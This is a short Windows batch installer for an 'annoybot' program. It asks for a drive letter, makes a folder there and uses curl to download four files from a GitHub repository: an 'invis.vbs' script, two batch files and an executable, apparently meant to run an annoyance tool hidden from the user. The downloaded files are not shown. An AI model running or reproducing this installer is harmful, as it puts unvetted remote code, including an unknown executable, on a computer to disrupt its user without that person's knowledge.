@echo off
wmic logicaldisk get name, description
set /p drive="Please type the drive letter with colon ( ex D: ) you would like to setup the script on: "
%drive%
mkdir annoybot
cd annoybot
curl -O https://raw.githubusercontent.com/Th3SnowyOwl/batchscripts/main/annoybot/invis.vbs
curl -O https://raw.githubusercontent.com/Th3SnowyOwl/batchscripts/main/annoybot/oof.bat
curl -O https://raw.githubusercontent.com/Th3SnowyOwl/batchscripts/main/annoybot/getCmdPID.exe
curl -O https://raw.githubusercontent.com/Th3SnowyOwl/batchscripts/main/annoybot/launch.bat
